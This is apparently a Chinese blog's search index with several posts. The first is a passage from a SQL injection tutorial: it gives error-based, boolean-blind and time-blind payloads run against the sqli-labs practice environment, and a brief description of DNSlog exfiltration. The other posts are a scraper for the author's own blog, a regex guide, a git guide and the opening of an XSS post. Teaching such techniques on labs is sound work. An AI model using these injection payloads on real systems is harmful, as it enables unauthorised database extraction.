<p><img src="https://s1.ax1x.com/2020/03/26/GSQj0J.png" alt="GSQj0J.png"></p>
<p>来点长的复杂的payload：</p>
<p><code>?id=1&#39;union select 1,count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database())))x from information_schema.columns group by x --+</code></p>
<p>可以看到此处将当前使用的数据库里所有表名全部爆了出来</p>
<p><img src="https://s1.ax1x.com/2020/03/26/GSlO8P.png" alt="GSlO8P.png"></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>​        在实际应用中，如果页面没有显示位，输出SQL执行的错误信息，但如果存在这样一种情况，即如果执行了正确的SQL语句，则返回一个页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句的正确与否，达到获取数据的目的。</p>
<p>​        布尔盲注有一个缺点，就是速度太慢，消耗大量时间。</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>布尔盲注的相关函数上面有提及，下面使用sqli-less8举例，这个就是用到布尔盲注进行爆破。</p>
<p>在sqli-less8中只有两种页面，没有显示位：</p>
<p>成功时页面为：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/G9wsV1.png" alt="G9wsV1.png"></p>
<p>失败时页面为：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/G9w656.png" alt="G9w656.png"></p>
<p>我们先获取数据库名的长度：</p>
<p><code>and (select length(database()))=长度</code></p>
<p><img src="https://s1.ax1x.com/2020/03/27/G9sy90.png" alt="G9sy90.png"></p>
<p>可以看到数据库名字长度为8位，然后我们可以逐一爆破出数据库的名字：</p>
<p><code>and (select ascii(substr(database(),位数,1)))=ascii码</code></p>
<p>猜解表的数量</p>
<p><code>and (select count(table_name) from information_schema.tables where table_schema=database())=数量</code></p>
<p>猜解某个表长度</p>
<p><code>and (select length(table_name) from information_schema.tables where table_schema=database() limit 某行,1)=长度</code></p>
<p>逐位猜解表名</p>
<p><code>and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit n,1)=ascii码</code></p>
<p>依次类推，知道可以猜解出全部的数据，整个猜解逻辑为：</p>
<ol>
<li>猜解数据库名字长度，然后猜解到数据库名字</li>
<li>猜解数据库表的数量，然后猜解每个表的名字长度，最后把每个表的名字猜解出来</li>
<li>猜解猜解列名数量，然后猜解某个列名长度，最后逐位猜解列名</li>
<li>判断数据的数量，然后猜解某条数据的长度，最后逐位猜解数据</li>
</ol>
<p>注意：猜解时候可以用到大于小于号，然后利用二分法加快查找，也可以使用Burp Suite暴力破解</p>
<h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>​        通过SQL语句查询的时间来进行注入，一般用于无页面回显，无报错，即只有一种页面的情况。</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p>​        关于延时盲注的相关函数上面也有介绍</p>
<p>​        实际中我们可以构造这样的payload：<code>if(1=1,sleep(5),1)</code>，当<code>1=1</code>为真时，页面将延时5秒回显，在这个判断语句中可以同布尔盲注一样加入蕴含数据库信息的语句。</p>
<p>​        下面进行用sqli-less9举例，sqli-less9就是一个具有延时盲注的注入点。</p>
<p><img src="https://s1.ax1x.com/2020/03/27/GPs2DS.png" alt="GPs2DS.png"></p>
<p>我们先获取数据库名的长度：</p>
<p><code>and if((select length(database()))=长度,sleep(5),0)</code></p>
<p><img src="https://s1.ax1x.com/2020/03/27/GPy2xx.png" alt="GPy2xx.png"></p>
<p>可以看到数据库名字长度为8位，当然可以通过<code>&gt;``&lt;</code>确定一个范围在进行搜索</p>
<p>其他的payload也可以依次类推出来，构造的查询语句和布尔盲注类似</p>
<p>猜解数据库名</p>
<p><code>and if((select ascii(substr(database(),位数,1))=ascii码),sleep(5),0)</code></p>
<p>判断表名的数量</p>
<p><code>and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(5),0)</code></p>
<p>判断某个表名的长度</p>
<p><code>and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(5),0)</code></p>
<p>等等，猜测的逻辑和布尔盲注相同。</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p>​        DNSlog注入，作用于Windows上服务器的SQL注入方式，MySQL像三级域名解析，像DNS服务器发送DNS请求，被记录在日志中，其中三级域名中含有数据库信息，查看日志即可获取信息。</p>
<p>原理过程如下：</p>
<p><img src="https://p4.ssl.qhimg.com/t01a278167ad3a008db.jpg" alt="dnslog.jpg"></p>
<p>（注意：LOAD_FILE函数使用是有条件的）</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>小工具-我的博客查看脚本</title>
    <url>/2020/03/18/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9F%A5%E7%9C%8B%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这段时间在学习正则，学完总想拿来实践一下，转头想了想，干起了老本行——爬虫，虽然之前写爬虫的时候也用到了正则，但是都是知其然不知其所以然，也好久没有过python写代码了，随便写了写脚本，之后也会写一些渗透用的脚本(poc或者exp)，这些都会放到杂项分类里面。</p>
<a id="more"></a>

<h1 id="程序目标"><a href="#程序目标" class="headerlink" title="程序目标"></a>程序目标</h1><p>​        思来想去，也没啥想爬取的内容，想起每次用hexo把博客推到远端，得要打开客户端看一下推成功了没，就像爬取一下自己博客的信息，只要用来练练手，就是没事做，闲得慌。</p>
<p>​        程序代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://bmoos.github.io"</span></span><br><span class="line">agent = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url,headers = agent)</span><br><span class="line">    <span class="comment">#编写正则表达式</span></span><br><span class="line">    pattern_url_name = re.compile(<span class="string">r'&lt;a href="(.*?)" class="post-title-link" itemprop="url"&gt;(.*?)&lt;/a&gt;'</span>)</span><br><span class="line">    pattern_lasttime = re.compile(<span class="string">r'&lt;time title="创建时间：(.*?)"'</span>)</span><br><span class="line">    pattern_word = re.compile(<span class="string">r'&lt;span&gt;([\d.\w]*)&lt;/span&gt;'</span>)</span><br><span class="line">    pattern_page = re.compile(<span class="string">r'&lt;a class="page-number" href="(.*?)"&gt;'</span>)</span><br><span class="line">    <span class="comment">#读取首页的信息</span></span><br><span class="line">    passage = re.findall(pattern_url_name,r.text)</span><br><span class="line">    lasttime = re.findall(pattern_lasttime,r.text)</span><br><span class="line">    word = re.findall(pattern_word,r.text)</span><br><span class="line">    page = re.findall(pattern_page,r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> page: <span class="comment">#读取其他页的信息</span></span><br><span class="line">        url_page = url + i</span><br><span class="line">        req = requests.get(url_page,headers = agent)</span><br><span class="line">        passage += re.findall(pattern_url_name,req.text)</span><br><span class="line">        lasttime += re.findall(pattern_lasttime,req.text)</span><br><span class="line">        word += re.findall(pattern_word,req.text)</span><br><span class="line">    all_information = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(passage)):</span><br><span class="line">        passage_information = []</span><br><span class="line">        passage_information.append(passage[i][<span class="number">0</span>])</span><br><span class="line">        passage_information.append(passage[i][<span class="number">1</span>])</span><br><span class="line">        passage_information.append(lasttime[i])</span><br><span class="line">        passage_information.append(word[i])</span><br><span class="line">        all_information.append(passage_information)</span><br><span class="line">    <span class="keyword">return</span> all_information</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_list</span><span class="params">()</span>:</span></span><br><span class="line">    table = init()</span><br><span class="line">    print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line">    print(<span class="string">'passage_name/create_time/word_number'</span>)</span><br><span class="line">    print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        print(table[i][<span class="number">1</span>]+<span class="string">'/'</span>+table[i][<span class="number">2</span>]+<span class="string">'/'</span>+table[i][<span class="number">3</span>])</span><br><span class="line">        print(<span class="string">'--------------------------------------------------'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_passage</span><span class="params">(name)</span>:</span></span><br><span class="line">    table = init()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        <span class="keyword">if</span> name == table[i][<span class="number">1</span>]:</span><br><span class="line">            urls = url + urllib.parse.unquote(table[i][<span class="number">0</span>])<span class="comment">#对url编码解码</span></span><br><span class="line">            print(<span class="string">'文章地址：'</span>+urls)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">'文章名出错'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">"%prog "</span> + <span class="string">"-l or -p &lt;passage&gt;"</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>, action = <span class="string">'store_true'</span>, dest = <span class="string">'list'</span>, help = <span class="string">'all passage information'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest = <span class="string">'passage_name'</span>, type = <span class="string">'string'</span>, help = <span class="string">'passage content'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.list <span class="keyword">and</span> options.passage_name == <span class="literal">None</span>:</span><br><span class="line">        print_list()</span><br><span class="line">    <span class="keyword">if</span> options.passage_name <span class="keyword">and</span> options.list == <span class="literal">None</span>:</span><br><span class="line">        print_passage(options.passage_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>用法：在命令行使用，有两个参数，一个是<code>-l</code>用来查看所有的博客文章：</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8DKTat.png" alt="8DKTat.png"></p>
<p>一个是<code>-p</code>后跟博客文章名，可以返回博客文章链接(PS：本来是想返回博客内容的，但是看到博客内容不是连续的文本，有很多标签分割，正则不可能，而且博客也有图片，最后实现和自己想的差很多，就只能返回博客文章地址，之后更新的时候或许会加入其他功能，之后在想)</p>
<p><img src="https://s1.ax1x.com/2020/03/18/8DlJUI.png" alt="8DlJUI.png"></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2020/03/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        正则表达式(Regular Expression)是一种<strong>文本模式</strong>，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。</p>
<p>​        正则表达式使用单个字符串来描述、匹配一系列匹配某个<strong>句法规则</strong>的字符串。</p>
<p>​        学习正则可以提高效率，而且现在大多语言都支持正则，之前因为觉得正则太复杂而放弃，现在有了大把时间可以重新学习一下。。。</p>
<p>​        注意：本文只是对正则入门级操作，复杂多样的正则不涉及(PS：太难了QAQ)。</p>
<a id="more"></a>

<h2 id="正则的普通用法"><a href="#正则的普通用法" class="headerlink" title="正则的普通用法"></a>正则的普通用法</h2><p>​        正则表达式描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<p>​        构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。</p>
<p>​        正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<p>（以上引用<a href="https://www.runoob.com/regexp/regexp-tutorial.html" target="_blank" rel="noopener">菜鸟教程正则表达式</a>）</p>
<p>​        简单来说正则表达式就是就一个用一些既定的规则表示要查找的子串格式，逻辑上说和正常生活中查找字符串逻辑差不多（用一些字符串的特征去查找），这是我的理解，对我来说正则表达式复杂多样，我只要会使用简单的正则，会读懂复杂正则表达式就足够了。</p>
<p>​        正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aChuj.png" alt="8aChuj.png"></p>
<p>​        (注意：遇到特殊字符，比如：<code>( ) / . * + { } ? $ ^</code>等可以用’ \ ‘进行转义)        </p>
<p>​        根据上图其实已经掌握了基本的正则表达式，现在举个例子</p>
<blockquote>
<p>This is somthing<br>is about<br>a blah<br>words<br>sequence of words<br>Hello and<br>GoodBye and<br>Go gogo!</p>
</blockquote>
<p>​        在其中找到长度为5的单词  <code>/\b\w{5}\b/g</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aETa9.png" alt="8aETa9.png"></p>
<p>注意：<code>*</code> <code>+</code>限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</p>
<blockquote>
<p>例如：<code>&lt;html&gt;javascript&gt;</code></p>
<p>正则表达式 <code>/&lt;.*&gt;/</code>和<code>/&lt;.+&gt;/</code>会匹配到<code>&lt;html&gt;javascript&gt;</code></p>
<p>而如果想要匹配<code>&lt;html&gt;</code>，可以用到<code>/&lt;.*？&gt;/</code>或<code>/&lt;.+？&gt;/</code></p>
</blockquote>
<h2 id="正则分类符"><a href="#正则分类符" class="headerlink" title="正则分类符"></a>正则分类符</h2><p>之前所说的是普通字符，现在来考虑分类符</p>
<p>eg：要查找电话号码，已知有如下三种格式的电话号码</p>
<blockquote>
<p>134-3737-4399</p>
<p>134.3737.4399</p>
<p>(029)8288-4399</p>
</blockquote>
<p>当然我们可以分别用<code>/\d{3}-\d{4}-\d{4}/</code> <code>/\d{3}.\d{4}.\d{4}/``/\(\d{3}\)\d{4}-\d{4}/</code>三个正则表达式来查找</p>
<p>但是有没有通用的正则表达式呢</p>
<p>当然，可以使用<code>[]</code>分类符</p>
<blockquote>
<p>bmoos bmoo$ bmoo3</p>
<p>可以用<code>/bmoo[s$3]/</code>来查找</p>
</blockquote>
<p>那么<code>[]</code>的意思就是在该位置上的字符是<code>[]</code>里的任意一个字符，可以理解为”或”</p>
<p>那上述电话号码可以用到通用的正则表达式<code>/\(?\d{3}[-.)]\d{4}[-.]\d{4}/</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8aDFfA.png" alt="8aDFfA.png"></p>
<p>刚才介绍了最简单和基本的功能，但是有些特殊的地方需要注意</p>
<ol>
<li>-连接符是第一个字符时</li>
</ol>
<p>比如<code>[-.]</code>的含义是连字符<code>-</code>或者点符<code>.</code>。 但是，如果当连字符不是第一个字符时，比如<code>[a-z]</code>，这就表示是从字母a到字符z。</p>
<ol>
<li><code>[]</code>中的<code>^</code></li>
</ol>
<p><code>^</code>在之前介绍中，是表示一行开头，但是在<code>[]</code>中，有着不同的含义。 <code>[ab]</code> 表示a或者b ，<code>[^ab]</code>表示啥都行，只要不是a或b，相当于取反</p>
<p>除了可以用<code>[]</code>表达或逻辑外，还可以用一种方式表达<code>(a|b)</code></p>
<p>eg：写一个邮箱的正则表达式：</p>
<blockquote>
<p><code>bilibili@126.com</code>  </p>
<p><code>protect@google.net</code> </p>
<p><code>hahaha.ha@xupt.edu</code></p>
<p><code>slibo921@gmail.com</code></p>
</blockquote>
<p>那么可以用正则表达式：<code>/[\w.]+@\w+\.(com|net|edu)/</code></p>
<p><img src="https://s1.ax1x.com/2020/03/17/8ac1sI.png" alt="8ac1sI.png"></p>
<h2 id="python中的正则"><a href="#python中的正则" class="headerlink" title="python中的正则"></a>python中的正则</h2><p>在python中正则主要使用re模块</p>
<p>re模块中有以下主要函数：</p>
<h3 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h3><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>
<p>函数语法：</p>
<p><code>re.match(pattern, string, flags)</code></p>
<h3 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<p>函数语法：</p>
<p><code>re.search(pattern, string, flags)</code></p>
<h3 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h3><p>Python 的re模块提供了re.sub用于替换字符串中的匹配项。</p>
<p>语法：</p>
<p><code>re.sub(pattern, repl, string, count=0, flags)</code></p>
<p>参数：</p>
<ul>
<li>pattern : 正则中的模式字符串。</li>
<li>repl : 替换的字符串，也可为一个函数。</li>
<li>string : 要被查找替换的原始字符串。</li>
<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
<li>flags : 编译时用的匹配模式，数字形式。</li>
</ul>
<p>前三个为必选参数，后两个为可选参数。</p>
<h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile 函数"></a>compile 函数</h3><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>
<p>语法格式为：</p>
<p><code>re.compile(pattern[, flags])</code></p>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p>
<p><strong>注意：</strong> match 和 search 是匹配一次 findall 匹配所有。</p>
<p>语法格式为：</p>
<p><code>re.findall(pattern, string, flags)</code></p>
<h3 id="re-finditer"><a href="#re-finditer" class="headerlink" title="re.finditer"></a>re.finditer</h3><p>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</p>
<p><code>re.finditer(pattern, string, flags)</code></p>
<h3 id="可选修饰符flags"><a href="#可选修饰符flags" class="headerlink" title="可选修饰符flags"></a>可选修饰符flags</h3><p><img src="https://s1.ax1x.com/2020/03/18/8dtpse.png" alt="8dtpse.png"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.im/post/5b5db5b8e51d4519155720d2#heading-6" target="_blank" rel="noopener">https://juejin.im/post/5b5db5b8e51d4519155720d2#heading-6</a></p>
<p><a href="https://www.runoob.com/regexp/regexp-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
<p><a href="https://www.runoob.com/python3/python3-reg-expressions.html" target="_blank" rel="noopener">https://www.runoob.com/python3/python3-reg-expressions.html</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>git使用</title>
    <url>/2020/03/10/git%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        git是一个开源的分布式版本控制系统，它能帮助你管理不同的版本，并且随时退回到任意时刻，而且也可以协同开发。之前也学过一点git，不过那阵用不到git，而且学的也比较琐碎难以理解，现在在我有一定基础的情况下，重新学习git，写下这份博客用以记录学习内容。Git指令繁多，但是常用的就十几条，下述介绍的指令掌握了足以应对常规使用，新的指令也会慢慢学习记录。</p>
<a id="more"></a>

<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="初始化一个仓库"><a href="#初始化一个仓库" class="headerlink" title="初始化一个仓库"></a>初始化一个仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>将当前目录变成Git可以管理的仓库，当前目录下多了一个<code>.git</code>的目录，这个目录是Git来跟踪管理版本库的。</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><p>先将文件加入暂存区</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<p>可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>将所有文件都加入暂存区</p>
<p>然后，把文件提交到仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>在此过程中，为了时刻掌握仓库状态，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<p>也可以查看提交日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br><span class="line">或 git log --all --graph --decorate (更好的显示)</span><br></pre></td></tr></table></figure>

<p>如果一次add后还没来得及commit，此时后悔了，则可以把文件从暂存区撤下，但是文件内容还是更改之后的形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><p><img src="https://s2.ax1x.com/2020/03/10/8PqITU.png" alt="8PqITU.png"></p>
<p>文件一共有四种状态</p>
<p>untracked：表示新建立的文件，之前没有被commit过</p>
<p>unmodified：表示仓库文件，文件被commit后的状态</p>
<p>modified：文件被更改之后，内容有了变更的状态</p>
<p>staged：暂存区文件，等待commit一起提交</p>
<h3 id="工作区和版本库"><a href="#工作区和版本库" class="headerlink" title="工作区和版本库"></a>工作区和版本库</h3><p>图示的很明晰</p>
<p><img src="https://s2.ax1x.com/2020/03/10/8PvOZq.png" alt="8PvOZq.png"></p>
<p><img src="https://s2.ax1x.com/2020/03/10/8PvzJU.png" alt="8PvzJU.png"></p>
<h3 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h3><p>当commit提交到仓库的时候，想回到上一个版本就可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset &lt;commitID&gt;</span><br></pre></td></tr></table></figure>

<p>这里commitID是commit每个操作的hash值，也有另一种表示方式</p>
<p>在Git中，用<code>HEAD</code>表示当前版本，上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>表示返回上一个版本，–hard是一个参数</p>
<p>现在来说明reset的参数：</p>
<blockquote>
<p>–hard：不保留所有变更</p>
<p>–soft：保留变更且变更内容处于staged</p>
<p>–mixed：保留变更且变更内容处于modified</p>
<p>（不带参数，默认就是mixed）</p>
</blockquote>
<p>Git提供了一个命令，用来记录你的每一次命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;name&gt;&lt;template&gt;</span><br><span class="line">或者 git switch -c &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>该命令用于新建一个分支，name是新建分支的名称，template为模板分支，如果不填，则以现在分支为模板</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure>

<p>用于显示所有的分支，当前分支前面会标一个<code>*</code>号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>用于切换分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -d &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>用于删除分支</p>
<h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>合并分支变更</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>合并有很多方式，具体内容使用可知</p>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当两个分支都做了修改，现在要将其合并一起，就会产生冲突，必须手动解决冲突后再提交</p>
<p><code>git status</code>也可以告诉我们冲突的文件</p>
<p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>将远程仓库下载到本地，远程仓库的默认名称是<code>origin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone &lt;Clone with SSH &gt;</span><br></pre></td></tr></table></figure>

<p>要查看远程库的信息，用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote</span><br></pre></td></tr></table></figure>

<p>或者，显示更详细的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<p>上面显示了可以抓取和推送的<code>origin</code>的地址。如果没有推送权限，就看不到push的地址。</p>
<p>可以在本地自建分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>然后将分支上传到远程仓库</p>
<p>第一次上传会没有上流分支而失败，所以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push --set-upstream origin &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>之后就可用<code>git push</code>上传更改到上流分支</p>
<h2 id="协同开发"><a href="#协同开发" class="headerlink" title="协同开发"></a>协同开发</h2><p>当多人对一个远程仓库开发时，都会在本地新建一个分支并在远程仓库上传分支，此时远程仓库是不断更新的，因为有多人不同时<code>git push</code></p>
<p>想要获得此时远程仓库的状态，可使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch</span><br></pre></td></tr></table></figure>

<p>如果此时发现有人在远程仓库新建了一个分支，而这个分支是本地没有的，则可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>切换并下载该分支</p>
<p>如果发现你的本地仓库比远程仓库老旧，需要更新，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>注意：如果你在<code>git push</code>时发现远程仓库是最新版，即别人<code>git push</code>了，而你的更改是对上一版的更改，此时就会产生冲突，你可以<code>git pull</code>将最新版下载下来，手动在本地解决冲突，然后再<code>git push</code></p>
<h2 id="变基"><a href="#变基" class="headerlink" title="变基"></a>变基</h2><p>实际应用中，或许存在这种情况，当你使用的分支源于某个模板分支，你已经在自己分支上进行过commit了，发现模板分支有被commit更新过，这个时候你想要将自己分支源于旧模板分支的base更新为新base，并且你提交在自己分支的commit要在新base之后，此时，你就可以用到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase &lt;BaseBranchName&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p><img src="https://s2.ax1x.com/2020/03/11/8kLsdx.png" alt="8kLsdx.png"></p>
<p>若此时在bc分支进行<code>git rebase master</code>会出现冲突，此时解决冲突后，<code>git add .</code>将变更存入暂存区，使用</p>
<p><code>git rebase --continue</code>继续下一个节点的rebase，以上操作直到变基完成，</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/av94549514" target="_blank" rel="noopener">https://www.bilibili.com/video/av94549514</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <url>/2020/03/03/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        XSS(cross site scripting)即跨站脚本攻击，是最常见的web应用程序漏洞之一。</p>
